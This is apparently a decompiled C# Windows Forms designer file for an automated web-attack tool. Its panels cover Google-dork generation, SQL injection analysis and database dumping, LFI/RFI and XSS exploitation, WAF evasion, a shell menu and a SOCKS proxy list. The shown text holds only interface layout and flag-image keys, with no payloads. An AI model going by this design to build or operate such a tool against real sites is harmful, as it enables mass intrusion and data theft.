		this.lblToolsConvertTextValue = new System.Windows.Forms.Label();
		this.btnConvertTextToHex = new System.Windows.Forms.Button();
		this.grbToolsIP = new System.Windows.Forms.GroupBox();
		this.numPingPort = new System.Windows.Forms.NumericUpDown();
		this.btnPing = new System.Windows.Forms.Button();
		this.btnResolve = new System.Windows.Forms.Button();
		this.txtResolveCountry = new System.Windows.Forms.TextBox();
		this.txtResolveIP = new System.Windows.Forms.TextBox();
		this.picResolveFlag = new System.Windows.Forms.PictureBox();
		this.lblToolsIPAddress = new System.Windows.Forms.Label();
		this.lblToolsIP = new System.Windows.Forms.Label();
		this.lblToolsIPCountry = new System.Windows.Forms.Label();
		this.txtResolveAddress = new System.Windows.Forms.TextBox();
		this.lblToolsIPport = new System.Windows.Forms.Label();
		this.pnlStatistics = new System.Windows.Forms.Panel();
		this.lvwStatistics = new ListViewExt();
		this.ColumnHeader34 = new System.Windows.Forms.ColumnHeader();
		this.ColumnHeader35 = new System.Windows.Forms.ColumnHeader();
		this.numSearchColumnThreads = new System.Windows.Forms.NumericUpDown();
		this.bckAlexa = new System.ComponentModel.BackgroundWorker();
		this.pnlLoginFinder = new System.Windows.Forms.Panel();
		this.bckImport = new System.ComponentModel.BackgroundWorker();
		this.pnlDorkGenerator = new System.Windows.Forms.Panel();
		this.pnlAnalizer = new System.Windows.Forms.Panel();
		this.pnlTree = new System.Windows.Forms.Panel();
		this.imlTree = new System.Windows.Forms.ImageList(this.icontainer_0);
		this.twMain = new TreeViewExt();
		this.stMain.SuspendLayout();
		this.mnuListView.SuspendLayout();
		this.mnuSocks.SuspendLayout();
		this.pnlSockList.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.dtgSocks).BeginInit();
		this.tsSocks.SuspendLayout();
		this.pnlSettings.SuspendLayout();
		this.GroupBox2.SuspendLayout();
		this.grbUpdater.SuspendLayout();
		this.grbAppSetthings.SuspendLayout();
		this.GroupBox4.SuspendLayout();
		this.grbExploithing.SuspendLayout();
		this.GroupBox1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numExploitingDelay).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numHTTPTimeout).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numHTTPRetry).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numScanningDelay).BeginInit();
		this.mnuExcludeUrlWords.SuspendLayout();
		this.pnlNotepad.SuspendLayout();
		this.mnuAbout.SuspendLayout();
		this.pnlScanner.SuspendLayout();
		this.grbScannerURL.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.dtgQueue).BeginInit();
		this.tsSearchFilter.SuspendLayout();
		this.grbDorks.SuspendLayout();
		this.mnuQueue.SuspendLayout();
		this.pnlExploiter.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.dtgFileInclusao).BeginInit();
		this.tsFileInclusao.SuspendLayout();
		this.pnlTrash.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.dtgTrash).BeginInit();
		this.mnuTrash.SuspendLayout();
		this.grbHttpLog.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.lvwHttpLog).BeginInit();
		this.mnuHttpLog.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.VisualStyler1).BeginInit();
		this.pnlSettingsAdvanced.SuspendLayout();
		this.grbXSS.SuspendLayout();
		this.mnuPaths.SuspendLayout();
		this.grbLfiLinux.SuspendLayout();
		this.tabFileInc.SuspendLayout();
		this.TabPage6.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numLFIpathTraversalCount).BeginInit();
		this.tpLfiWin.SuspendLayout();
		this.grbSQLi.SuspendLayout();
		this.tabSQLi.SuspendLayout();
		this.TabPage1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numAnalizerUnionEnd).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.numAnalizerUnionSart).BeginInit();
		this.TabPage2.SuspendLayout();
		this.TabPage3.SuspendLayout();
		this.grbHTTPExploit.SuspendLayout();
		this.grbFileIncWAFs.SuspendLayout();
		this.grbRFI.SuspendLayout();
		this.grbScanner.SuspendLayout();
		this.tabScanner.SuspendLayout();
		this.TabPage4.SuspendLayout();
		this.mnuScannerDomain.SuspendLayout();
		this.TabPage5.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numThreads).BeginInit();
		this.tsWorker.SuspendLayout();
		this.pnlSQLi.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.dtgSQLi).BeginInit();
		this.tsSearchColumn.SuspendLayout();
		this.tsSQLi.SuspendLayout();
		this.mnuSearchColumn.SuspendLayout();
		this.pnlSQLiNoInjectable.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.dtgSQLiNoInjectable).BeginInit();
		this.tsSQLiNoInjectable.SuspendLayout();
		this.mnuDownloads.SuspendLayout();
		this.pnlTools.SuspendLayout();
		this.grbToolsConvertEnc.SuspendLayout();
		this.grbToolsIP.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numPingPort).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.picResolveFlag).BeginInit();
		this.pnlStatistics.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.numSearchColumnThreads).BeginInit();
		base.SuspendLayout();
		this.stMain.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.stMain.Items.AddRange(new System.Windows.Forms.ToolStripItem[3] { this.lblMainStatus, this.lblDownloads, this.lblIP });
		this.stMain.Location = new System.Drawing.Point(0, 1089);
		this.stMain.Name = "stMain";
		this.stMain.Padding = new System.Windows.Forms.Padding(2, 0, 21, 0);
		this.stMain.Size = new System.Drawing.Size(2583, 30);
		this.stMain.Stretch = false;
		this.stMain.TabIndex = 11;
		this.stMain.Text = "StatusStrip1";
		this.lblMainStatus.Name = "lblMainStatus";
		this.lblMainStatus.Size = new System.Drawing.Size(2393, 25);
		this.lblMainStatus.Spring = true;
		this.lblMainStatus.Text = "Ready";
		this.lblMainStatus.TextAlign = System.Drawing.ContentAlignment.MiddleLeft;
		this.lblDownloads.AutoToolTip = true;
		this.lblDownloads.DoubleClickEnabled = true;
		this.lblDownloads.Name = "lblDownloads";
		this.lblDownloads.Size = new System.Drawing.Size(121, 25);
		this.lblDownloads.Text = "lblDownloads";
		this.lblDownloads.ToolTipText = "Double Click to reset";
		this.lblIP.DoubleClickEnabled = true;
		this.lblIP.Name = "lblIP";
		this.lblIP.Size = new System.Drawing.Size(0, 25);
		this.mnuListView.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.mnuListView.Items.AddRange(new System.Windows.Forms.ToolStripItem[17]
		{
			this.mnuLWShell, this.mnuLWClipboard, this.mnuLWAlexa, this.mnuLWSelectAll, this.mnuLWSelectAllSP, this.mnuLWGoNewDumper, this.mnuLWGoDumper, this.mnuLWGoFileDumper, this.mnuLWGoNewDumperSP, this.mnuLWReExploiter,
			this.mnuLWExport, this.mnuLWRemoveSP, this.mnuLWTrash, this.mnuLWRemove, this.mnuLWAutoScrollSP, this.mnuLWAutoScroll, this.mnuLWSelected
		});
		this.mnuListView.Name = "mnuChecked";
		this.mnuListView.ShowImageMargin = false;
		this.mnuListView.ShowItemToolTips = false;
		this.mnuListView.Size = new System.Drawing.Size(184, 418);
		this.mnuLWShell.Name = "mnuLWShell";
		this.mnuLWShell.Size = new System.Drawing.Size(183, 30);
		this.mnuLWShell.Text = "Shell";
		this.mnuLWClipboard.Name = "mnuLWClipboard";
		this.mnuLWClipboard.Size = new System.Drawing.Size(183, 30);
		this.mnuLWClipboard.Text = "Clipboard";
		this.mnuLWAlexa.Name = "mnuLWAlexa";
		this.mnuLWAlexa.Size = new System.Drawing.Size(183, 30);
		this.mnuLWAlexa.Text = "Alexa Rank";
		this.mnuLWSelectAll.Name = "mnuLWSelectAll";
		this.mnuLWSelectAll.Size = new System.Drawing.Size(183, 30);
		this.mnuLWSelectAll.Text = "Select All";
		this.mnuLWSelectAllSP.Name = "mnuLWSelectAllSP";
		this.mnuLWSelectAllSP.Size = new System.Drawing.Size(180, 6);
		this.mnuLWGoNewDumper.Name = "mnuLWGoNewDumper";
		this.mnuLWGoNewDumper.Size = new System.Drawing.Size(183, 30);
		this.mnuLWGoNewDumper.Text = "New Dumper..";
		this.mnuLWGoDumper.Name = "mnuLWGoDumper";
		this.mnuLWGoDumper.Size = new System.Drawing.Size(183, 30);
		this.mnuLWGoDumper.Text = "Go Dumper..";
		this.mnuLWGoFileDumper.Name = "mnuLWGoFileDumper";
		this.mnuLWGoFileDumper.Size = new System.Drawing.Size(183, 30);
		this.mnuLWGoFileDumper.Text = "Go File Dumper";
		this.mnuLWGoNewDumperSP.Name = "mnuLWGoNewDumperSP";
		this.mnuLWGoNewDumperSP.Size = new System.Drawing.Size(180, 6);
		this.mnuLWReExploiter.Name = "mnuLWReExploiter";
		this.mnuLWReExploiter.Size = new System.Drawing.Size(183, 30);
		this.mnuLWReExploiter.Text = "Re-Exploiter";
		this.mnuLWExport.Name = "mnuLWExport";
		this.mnuLWExport.Size = new System.Drawing.Size(183, 30);
		this.mnuLWExport.Text = "Export";
		this.mnuLWRemoveSP.Name = "mnuLWRemoveSP";
		this.mnuLWRemoveSP.Size = new System.Drawing.Size(180, 6);
		this.mnuLWTrash.Name = "mnuLWTrash";
		this.mnuLWTrash.Size = new System.Drawing.Size(183, 30);
		this.mnuLWTrash.Text = "Move to Trash";
		this.mnuLWRemove.Name = "mnuLWRemove";
		this.mnuLWRemove.Size = new System.Drawing.Size(183, 30);
		this.mnuLWRemove.Text = "Remove";
		this.mnuLWAutoScrollSP.Name = "mnuLWAutoScrollSP";
		this.mnuLWAutoScrollSP.Size = new System.Drawing.Size(180, 6);
		this.mnuLWAutoScroll.Name = "mnuLWAutoScroll";
		this.mnuLWAutoScroll.Size = new System.Drawing.Size(183, 30);
		this.mnuLWAutoScroll.Text = "Auto Scroll: No";
		this.mnuLWSelected.Enabled = false;
		this.mnuLWSelected.Name = "mnuLWSelected";
		this.mnuLWSelected.Size = new System.Drawing.Size(183, 30);
		this.mnuLWSelected.Text = "Selected: ";
		this.imgData.ImageStream = (System.Windows.Forms.ImageListStreamer)resources.GetObject("imgData.ImageStream");
		this.imgData.TransparentColor = System.Drawing.Color.Transparent;
		this.imgData.Images.SetKeyName(0, "ad.png");
		this.imgData.Images.SetKeyName(1, "ae.png");
		this.imgData.Images.SetKeyName(2, "af.png");
		this.imgData.Images.SetKeyName(3, "ag.png");
		this.imgData.Images.SetKeyName(4, "ai.png");
		this.imgData.Images.SetKeyName(5, "al.png");
		this.imgData.Images.SetKeyName(6, "am.png");
		this.imgData.Images.SetKeyName(7, "an.png");
		this.imgData.Images.SetKeyName(8, "ao.png");
		this.imgData.Images.SetKeyName(9, "ar.png");
		this.imgData.Images.SetKeyName(10, "as.png");
		this.imgData.Images.SetKeyName(11, "at.png");
		this.imgData.Images.SetKeyName(12, "au.png");
		this.imgData.Images.SetKeyName(13, "aw.png");
		this.imgData.Images.SetKeyName(14, "ax.png");
		this.imgData.Images.SetKeyName(15, "az.png");
		this.imgData.Images.SetKeyName(16, "ba.png");
		this.imgData.Images.SetKeyName(17, "bb.png");
		this.imgData.Images.SetKeyName(18, "bd.png");
		this.imgData.Images.SetKeyName(19, "be.png");
		this.imgData.Images.SetKeyName(20, "bf.png");
		this.imgData.Images.SetKeyName(21, "bg.png");
		this.imgData.Images.SetKeyName(22, "bh.png");
		this.imgData.Images.SetKeyName(23, "bi.png");
		this.imgData.Images.SetKeyName(24, "bj.png");
		this.imgData.Images.SetKeyName(25, "bm.png");
		this.imgData.Images.SetKeyName(26, "bn.png");
		this.imgData.Images.SetKeyName(27, "bo.png");
		this.imgData.Images.SetKeyName(28, "br.png");
		this.imgData.Images.SetKeyName(29, "bs.png");
		this.imgData.Images.SetKeyName(30, "bt.png");
		this.imgData.Images.SetKeyName(31, "bv.png");
		this.imgData.Images.SetKeyName(32, "bw.png");
		this.imgData.Images.SetKeyName(33, "by.png");
		this.imgData.Images.SetKeyName(34, "bz.png");
		this.imgData.Images.SetKeyName(35, "ca.png");
		this.imgData.Images.SetKeyName(36, "catalonia.png");
		this.imgData.Images.SetKeyName(37, "cc.png");
		this.imgData.Images.SetKeyName(38, "cd.png");
		this.imgData.Images.SetKeyName(39, "cf.png");
		this.imgData.Images.SetKeyName(40, "cg.png");
		this.imgData.Images.SetKeyName(41, "ch.png");
		this.imgData.Images.SetKeyName(42, "ci.png");
		this.imgData.Images.SetKeyName(43, "ck.png");
		this.imgData.Images.SetKeyName(44, "cl.png");
		this.imgData.Images.SetKeyName(45, "cm.png");
		this.imgData.Images.SetKeyName(46, "cn.png");
		this.imgData.Images.SetKeyName(47, "co.png");
		this.imgData.Images.SetKeyName(48, "cr.png");
		this.imgData.Images.SetKeyName(49, "cs.png");
		this.imgData.Images.SetKeyName(50, "cu.png");
		this.imgData.Images.SetKeyName(51, "cv.png");
		this.imgData.Images.SetKeyName(52, "cx.png");
		this.imgData.Images.SetKeyName(53, "cy.png");
		this.imgData.Images.SetKeyName(54, "cz.png");
		this.imgData.Images.SetKeyName(55, "de.png");
		this.imgData.Images.SetKeyName(56, "dj.png");
		this.imgData.Images.SetKeyName(57, "dk.png");
		this.imgData.Images.SetKeyName(58, "dm.png");
		this.imgData.Images.SetKeyName(59, "do.png");
		this.imgData.Images.SetKeyName(60, "dz.png");
		this.imgData.Images.SetKeyName(61, "ec.png");
		this.imgData.Images.SetKeyName(62, "ee.png");
		this.imgData.Images.SetKeyName(63, "eg.png");
		this.imgData.Images.SetKeyName(64, "eh.png");
		this.imgData.Images.SetKeyName(65, "england.png");
		this.imgData.Images.SetKeyName(66, "er.png");
		this.imgData.Images.SetKeyName(67, "es.png");
		this.imgData.Images.SetKeyName(68, "et.png");
		this.imgData.Images.SetKeyName(69, "europeanunion.png");
		this.imgData.Images.SetKeyName(70, "fam.png");
		this.imgData.Images.SetKeyName(71, "fi.png");
		this.imgData.Images.SetKeyName(72, "fj.png");
		this.imgData.Images.SetKeyName(73, "fk.png");
		this.imgData.Images.SetKeyName(74, "fm.png");
		this.imgData.Images.SetKeyName(75, "fo.png");
		this.imgData.Images.SetKeyName(76, "fr.png");
		this.imgData.Images.SetKeyName(77, "ga.png");
		this.imgData.Images.SetKeyName(78, "gb.png");
		this.imgData.Images.SetKeyName(79, "gd.png");
		this.imgData.Images.SetKeyName(80, "ge.png");
		this.imgData.Images.SetKeyName(81, "gf.png");
		this.imgData.Images.SetKeyName(82, "gh.png");
		this.imgData.Images.SetKeyName(83, "gi.png");
		this.imgData.Images.SetKeyName(84, "gl.png");
		this.imgData.Images.SetKeyName(85, "gm.png");
		this.imgData.Images.SetKeyName(86, "gn.png");
		this.imgData.Images.SetKeyName(87, "gp.png");
		this.imgData.Images.SetKeyName(88, "gq.png");
		this.imgData.Images.SetKeyName(89, "gr.png");
		this.imgData.Images.SetKeyName(90, "gs.png");
		this.imgData.Images.SetKeyName(91, "gt.png");
		this.imgData.Images.SetKeyName(92, "gu.png");
		this.imgData.Images.SetKeyName(93, "gw.png");
		this.imgData.Images.SetKeyName(94, "gy.png");
		this.imgData.Images.SetKeyName(95, "hk.png");
		this.imgData.Images.SetKeyName(96, "hm.png");
		this.imgData.Images.SetKeyName(97, "hn.png");
		this.imgData.Images.SetKeyName(98, "hr.png");
		this.imgData.Images.SetKeyName(99, "ht.png");
		this.imgData.Images.SetKeyName(100, "hu.png");
		this.imgData.Images.SetKeyName(101, "id.png");
		this.imgData.Images.SetKeyName(102, "ie.png");
		this.imgData.Images.SetKeyName(103, "il.png");
		this.imgData.Images.SetKeyName(104, "in.png");
		this.imgData.Images.SetKeyName(105, "io.png");
		this.imgData.Images.SetKeyName(106, "iq.png");
		this.imgData.Images.SetKeyName(107, "ir.png");
		this.imgData.Images.SetKeyName(108, "is.png");
		this.imgData.Images.SetKeyName(109, "it.png");
		this.imgData.Images.SetKeyName(110, "jm.png");
		this.imgData.Images.SetKeyName(111, "jo.png");
		this.imgData.Images.SetKeyName(112, "jp.png");
		this.imgData.Images.SetKeyName(113, "ke.png");
		this.imgData.Images.SetKeyName(114, "kg.png");
		this.imgData.Images.SetKeyName(115, "kh.png");
		this.imgData.Images.SetKeyName(116, "ki.png");
		this.imgData.Images.SetKeyName(117, "km.png");
		this.imgData.Images.SetKeyName(118, "kn.png");
		this.imgData.Images.SetKeyName(119, "kp.png");
		this.imgData.Images.SetKeyName(120, "kr.png");
		this.imgData.Images.SetKeyName(121, "kw.png");
		this.imgData.Images.SetKeyName(122, "ky.png");
		this.imgData.Images.SetKeyName(123, "kz.png");
		this.imgData.Images.SetKeyName(124, "la.png");
		this.imgData.Images.SetKeyName(125, "lb.png");
		this.imgData.Images.SetKeyName(126, "lc.png");
		this.imgData.Images.SetKeyName(127, "li.png");
		this.imgData.Images.SetKeyName(128, "lk.png");
		this.imgData.Images.SetKeyName(129, "lr.png");
		this.imgData.Images.SetKeyName(130, "ls.png");
		this.imgData.Images.SetKeyName(131, "lt.png");
		this.imgData.Images.SetKeyName(132, "lu.png");
		this.imgData.Images.SetKeyName(133, "lv.png");
		this.imgData.Images.SetKeyName(134, "ly.png");
		this.imgData.Images.SetKeyName(135, "ma.png");
		this.imgData.Images.SetKeyName(136, "mc.png");
		this.imgData.Images.SetKeyName(137, "md.png");
		this.imgData.Images.SetKeyName(138, "me.png");
		this.imgData.Images.SetKeyName(139, "mg.png");
		this.imgData.Images.SetKeyName(140, "mh.png");
		this.imgData.Images.SetKeyName(141, "mk.png");
		this.imgData.Images.SetKeyName(142, "ml.png");
		this.imgData.Images.SetKeyName(143, "mm.png");
		this.imgData.Images.SetKeyName(144, "mn.png");
		this.imgData.Images.SetKeyName(145, "mo.png");
		this.imgData.Images.SetKeyName(146, "mp.png");
		this.imgData.Images.SetKeyName(147, "mq.png");
		this.imgData.Images.SetKeyName(148, "mr.png");
		this.imgData.Images.SetKeyName(149, "ms.png");
		this.imgData.Images.SetKeyName(150, "mt.png");
		this.imgData.Images.SetKeyName(151, "mu.png");
		this.imgData.Images.SetKeyName(152, "mv.png");
		this.imgData.Images.SetKeyName(153, "mw.png");
		this.imgData.Images.SetKeyName(154, "mx.png");
		this.imgData.Images.SetKeyName(155, "my.png");
		this.imgData.Images.SetKeyName(156, "mz.png");
		this.imgData.Images.SetKeyName(157, "na.png");
		this.imgData.Images.SetKeyName(158, "nc.png");
		this.imgData.Images.SetKeyName(159, "ne.png");
		this.imgData.Images.SetKeyName(160, "nf.png");
		this.imgData.Images.SetKeyName(161, "ng.png");
		this.imgData.Images.SetKeyName(162, "ni.png");
		this.imgData.Images.SetKeyName(163, "nl.png");
		this.imgData.Images.SetKeyName(164, "no.png");
		this.imgData.Images.SetKeyName(165, "np.png");
		this.imgData.Images.SetKeyName(166, "nr.png");
		this.imgData.Images.SetKeyName(167, "nu.png");
		this.imgData.Images.SetKeyName(168, "nz.png");
		this.imgData.Images.SetKeyName(169, "om.png");
		this.imgData.Images.SetKeyName(170, "pa.png");
		this.imgData.Images.SetKeyName(171, "pe.png");
		this.imgData.Images.SetKeyName(172, "pf.png");
		this.imgData.Images.SetKeyName(173, "pg.png");
		this.imgData.Images.SetKeyName(174, "ph.png");
		this.imgData.Images.SetKeyName(175, "pk.png");
		this.imgData.Images.SetKeyName(176, "pl.png");
		this.imgData.Images.SetKeyName(177, "pm.png");
		this.imgData.Images.SetKeyName(178, "pn.png");
		this.imgData.Images.SetKeyName(179, "pr.png");
		this.imgData.Images.SetKeyName(180, "ps.png");
		this.imgData.Images.SetKeyName(181, "pt.png");
		this.imgData.Images.SetKeyName(182, "pw.png");
		this.imgData.Images.SetKeyName(183, "py.png");
		this.imgData.Images.SetKeyName(184, "qa.png");
		this.imgData.Images.SetKeyName(185, "re.png");
		this.imgData.Images.SetKeyName(186, "ro.png");
		this.imgData.Images.SetKeyName(187, "rs.png");
		this.imgData.Images.SetKeyName(188, "ru.png");
		this.imgData.Images.SetKeyName(189, "rw.png");
		this.imgData.Images.SetKeyName(190, "sa.png");
		this.imgData.Images.SetKeyName(191, "sb.png");
		this.imgData.Images.SetKeyName(192, "sc.png");
		this.imgData.Images.SetKeyName(193, "scotland.png");
		this.imgData.Images.SetKeyName(194, "sd.png");
		this.imgData.Images.SetKeyName(195, "se.png");
		this.imgData.Images.SetKeyName(196, "sg.png");
		this.imgData.Images.SetKeyName(197, "sh.png");
		this.imgData.Images.SetKeyName(198, "si.png");
		this.imgData.Images.SetKeyName(199, "sj.png");
		this.imgData.Images.SetKeyName(200, "sk.png");
		this.imgData.Images.SetKeyName(201, "sl.png");
		this.imgData.Images.SetKeyName(202, "sm.png");
		this.imgData.Images.SetKeyName(203, "sn.png");
		this.imgData.Images.SetKeyName(204, "so.png");
		this.imgData.Images.SetKeyName(205, "sr.png");
		this.imgData.Images.SetKeyName(206, "st.png");
		this.imgData.Images.SetKeyName(207, "sv.png");
		this.imgData.Images.SetKeyName(208, "sy.png");
		this.imgData.Images.SetKeyName(209, "sz.png");
		this.imgData.Images.SetKeyName(210, "tc.png");
		this.imgData.Images.SetKeyName(211, "td.png");
		this.imgData.Images.SetKeyName(212, "tf.png");
		this.imgData.Images.SetKeyName(213, "tg.png");
		this.imgData.Images.SetKeyName(214, "th.png");
		this.imgData.Images.SetKeyName(215, "tj.png");
		this.imgData.Images.SetKeyName(216, "tk.png");
		this.imgData.Images.SetKeyName(217, "tl.png");
		this.imgData.Images.SetKeyName(218, "tm.png");
		this.imgData.Images.SetKeyName(219, "tn.png");
		this.imgData.Images.SetKeyName(220, "to.png");
		this.imgData.Images.SetKeyName(221, "tr.png");
		this.imgData.Images.SetKeyName(222, "tt.png");
		this.imgData.Images.SetKeyName(223, "tv.png");
		this.imgData.Images.SetKeyName(224, "tw.png");
		this.imgData.Images.SetKeyName(225, "tz.png");
		this.imgData.Images.SetKeyName(226, "ua.png");
		this.imgData.Images.SetKeyName(227, "ug.png");
		this.imgData.Images.SetKeyName(228, "um.png");
		this.imgData.Images.SetKeyName(229, "us.png");
		this.imgData.Images.SetKeyName(230, "uy.png");
		this.imgData.Images.SetKeyName(231, "uz.png");
		this.imgData.Images.SetKeyName(232, "va.png");
		this.imgData.Images.SetKeyName(233, "vc.png");
		this.imgData.Images.SetKeyName(234, "ve.png");
		this.imgData.Images.SetKeyName(235, "vg.png");
		this.imgData.Images.SetKeyName(236, "vi.png");
		this.imgData.Images.SetKeyName(237, "vn.png");
		this.imgData.Images.SetKeyName(238, "vu.png");
		this.imgData.Images.SetKeyName(239, "wales.png");
		this.imgData.Images.SetKeyName(240, "wf.png");
		this.imgData.Images.SetKeyName(241, "ws.png");
		this.imgData.Images.SetKeyName(242, "ye.png");
		this.imgData.Images.SetKeyName(243, "yt.png");
		this.imgData.Images.SetKeyName(244, "za.png");
		this.imgData.Images.SetKeyName(245, "zm.png");
		this.imgData.Images.SetKeyName(246, "zw.png");
		this.imgData.Images.SetKeyName(247, "--.png");
		this.mnuSocks.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.mnuSocks.Items.AddRange(new System.Windows.Forms.ToolStripItem[5] { this.mnuSocksCheck, this.mnuSocksUnCheck, this.ToolStripMenuItem5, this.mnuSocksSelectAll, this.mnuSocksRemove });
		this.mnuSocks.Name = "mnuChecked";
		this.mnuSocks.ShowImageMargin = false;
		this.mnuSocks.ShowItemToolTips = false;
		this.mnuSocks.Size = new System.Drawing.Size(154, 130);
		this.mnuSocksCheck.Name = "mnuSocksCheck";
		this.mnuSocksCheck.Size = new System.Drawing.Size(153, 30);
		this.mnuSocksCheck.Text = "Check All";
		this.mnuSocksUnCheck.Name = "mnuSocksUnCheck";
		this.mnuSocksUnCheck.Size = new System.Drawing.Size(153, 30);
		this.mnuSocksUnCheck.Text = "UnCheck All";
		this.ToolStripMenuItem5.Name = "ToolStripMenuItem5";
		this.ToolStripMenuItem5.Size = new System.Drawing.Size(150, 6);
		this.mnuSocksSelectAll.Name = "mnuSocksSelectAll";
		this.mnuSocksSelectAll.Size = new System.Drawing.Size(153, 30);
		this.mnuSocksSelectAll.Text = "Select All";
		this.mnuSocksRemove.Name = "mnuSocksRemove";
		this.mnuSocksRemove.Size = new System.Drawing.Size(153, 30);
		this.mnuSocksRemove.Text = "Remove";
		this.pnlAbout.BackColor = System.Drawing.Color.Black;
		this.pnlAbout.Location = new System.Drawing.Point(2248, 698);
		this.pnlAbout.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.pnlAbout.Name = "pnlAbout";
		this.pnlAbout.Size = new System.Drawing.Size(90, 60);
		this.pnlAbout.TabIndex = 22;
		this.pnlAbout.Visible = false;
		this.pnlSockList.AutoScroll = true;
		this.pnlSockList.Controls.Add(this.dtgSocks);
		this.pnlSockList.Controls.Add(this.tsSocks);
		this.pnlSockList.Location = new System.Drawing.Point(267, 414);
		this.pnlSockList.Margin = new System.Windows.Forms.Padding(4, 5, 4, 5);
		this.pnlSockList.Name = "pnlSockList";
		this.pnlSockList.Size = new System.Drawing.Size(619, 97);
		this.pnlSockList.TabIndex = 23;
		this.pnlSockList.Visible = false;
		this.dtgSocks.AllowUserToAddRows = false;
		this.dtgSocks.AllowUserToDeleteRows = false;
		this.dtgSocks.AllowUserToResizeRows = false;
		this.dtgSocks.BackgroundColor = System.Drawing.SystemColors.Window;
		this.dtgSocks.BorderStyle = System.Windows.Forms.BorderStyle.Fixed3D;
		this.dtgSocks.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.dtgSocks.Columns.AddRange(this.Column14, this.DataGridViewImageColumn3, this.DataGridViewTextBoxColumn10, this.DataGridViewTextBoxColumn11, this.DataGridViewTextBoxColumn12, this.Column5, this.Column15);
		this.dtgSocks.ContextMenuStrip = this.mnuSocks;
		this.dtgSocks.Dock = System.Windows.Forms.DockStyle.Fill;
		this.dtgSocks.Location = new System.Drawing.Point(0, 32);
		this.dtgSocks.Name = "dtgSocks";
		this.dtgSocks.RowHeadersVisible = false;
		this.dtgSocks.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.dtgSocks.ShowCellErrors = false;
		this.dtgSocks.ShowEditingIcon = false;
		this.dtgSocks.ShowRowErrors = false;
		this.dtgSocks.Size = new System.Drawing.Size(619, 65);
		this.dtgSocks.TabIndex = 40;
		this.Column14.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.None;
		dataGridViewCellStyle.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleRight;
		dataGridViewCellStyle.NullValue = false;
		this.Column14.DefaultCellStyle = dataGridViewCellStyle;
		this.Column14.HeaderText = "";
		this.Column14.MinimumWidth = 20;
		this.Column14.Name = "Column14";
		this.Column14.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.Column14.Width = 20;
		this.DataGridViewImageColumn3.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewImageColumn3.HeaderText = "";
		this.DataGridViewImageColumn3.Name = "DataGridViewImageColumn3";
		this.DataGridViewImageColumn3.ReadOnly = true;
		this.DataGridViewImageColumn3.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.DataGridViewImageColumn3.Width = 5;
		this.DataGridViewTextBoxColumn10.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn10.HeaderText = "IP";
		this.DataGridViewTextBoxColumn10.Name = "DataGridViewTextBoxColumn10";
		this.DataGridViewTextBoxColumn10.ReadOnly = true;
		this.DataGridViewTextBoxColumn10.Resizable = System.Windows.Forms.DataGridViewTriState.False;
		this.DataGridViewTextBoxColumn10.Width = 60;
		this.DataGridViewTextBoxColumn11.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn11.HeaderText = "Type";
		this.DataGridViewTextBoxColumn11.Name = "DataGridViewTextBoxColumn11";
		this.DataGridViewTextBoxColumn11.ReadOnly = true;
		this.DataGridViewTextBoxColumn11.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn11.Width = 79;
		this.DataGridViewTextBoxColumn12.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.DataGridViewTextBoxColumn12.HeaderText = "User";
		this.DataGridViewTextBoxColumn12.Name = "DataGridViewTextBoxColumn12";
		this.DataGridViewTextBoxColumn12.ReadOnly = true;
		this.DataGridViewTextBoxColumn12.Resizable = System.Windows.Forms.DataGridViewTriState.True;
		this.DataGridViewTextBoxColumn12.Width = 79;
		this.Column5.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column5.HeaderText = "Password";
		this.Column5.Name = "Column5";
		this.Column5.ReadOnly = true;
		this.Column5.Width = 114;
		this.Column15.AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
		this.Column15.HeaderText = "Country";
		this.Column15.Name = "Column15";
		this.Column15.ReadOnly = true;
		this.tsSocks.GripStyle = System.Windows.Forms.ToolStripGripStyle.Hidden;
		this.tsSocks.ImageScalingSize = new System.Drawing.Size(24, 24);
		this.tsSocks.Items.AddRange(new System.Windows.Forms.ToolStripItem[12]
		{
			this.lblSocksCount, this.btnSocksClear, this.ToolStripSeparator15, this.btnSocksUrl, this.ToolStripSeparator16, this.btnSocksAppend, this.ToolStripSeparator17, this.btnSocksNew, this.ToolStripSeparator14, this.btnSocksMyIP,
			this.ToolStripLabel9, this.btnSocksTest
		});
		this.tsSocks.Location = new System.Drawing.Point(0, 0);
		this.tsSocks.Name = "tsSocks";
